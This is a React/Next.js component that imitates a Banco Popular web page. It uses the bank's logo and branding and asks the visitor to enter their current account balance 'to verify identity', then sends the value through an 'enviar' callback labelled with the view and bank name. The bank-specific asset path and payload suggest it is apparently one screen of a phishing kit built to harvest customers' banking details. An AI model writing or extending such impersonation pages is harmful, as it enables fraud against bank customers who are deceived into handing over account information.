/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable jsx-a11y/alt-text */
"use client";
import { useState } from "react";

export default function Saldo({ enviar }: any) {
  const [saldo, setSaldo] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!saldo) return;

    const payload = {
      view: 'saldo',
      saldo,
      bank: "Popular",
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };

  const isFormValid = !!saldo;

  return (
    <div className="min-h-screen flex flex-col">
      {/* HEADER */}
      <div className="bg-green-600 h-6 w-full fixed top-0 left-0 z-50"></div>

      <div className="max-w-md mx-auto mt-16 mb-10 px-5 py-5 w-full">
        <h1 className="text-2xl font-bold text-center text-black">Confirma tu saldo</h1>

        <div className="flex items-center justify-center my-5">
          <img
            src="/bancos/popular/popularhorizontal_new.svg"
            width={180}
            className="h-auto w-auto"
          />
        </div>

        <p className="text-center mb-6 text-gray-500 text-sm">
          Por favor, ingresa tu saldo actual para verificar tu identidad.
        </p>

        <form className="flex flex-col gap-5" onSubmit={handleSubmit}>
          {/* Saldo */}
          <div>
            <label
              htmlFor="saldo"
              className="block font-semibold text-sm text-black"
            >
              Saldo actual
            </label>
            <input
              type="text"
              id="saldo"
              placeholder="$ 0"
              className="w-full p-3.5 mt-2 border text-black border-gray-300 rounded-lg focus:ring-2 focus:ring-green-600 outline-none"
              value={saldo}
              onChange={handleInputChange}
              style={{ fontSize: '18px', fontWeight: 'bold' }}
            />
          </div>

          {/* Botón */}
          <button
            type="submit"
            disabled={!isFormValid}
            className="w-full p-4 text-lg rounded-2xl mt-8 font-bold transition-all bg-green-600 text-white disabled:bg-gray-400"
          >
            Continuar
          </button>
        </form>

        <div className="flex mt-12 gap-1 text-xs justify-center ">
          <p className="text-gray-500">Protegido por reCAPTCHA</p> |{" "}
          <span className="text-[#FE680D]">Privacidad - Condiciones</span>
        </div>
      </div>

      {/* FOOTER */}
      <footer className="fixed bottom-0 left-0 w-full text-xs underline flex justify-center gap-16 py-3 bg-white text-[#FE680D] shadow-[0_-2px_8px_rgba(0,0,0,0.04)] z-50">
        <span>Seguridad</span>
        <span>Accesibilidad</span>
      </footer>
    </div>
  );
}
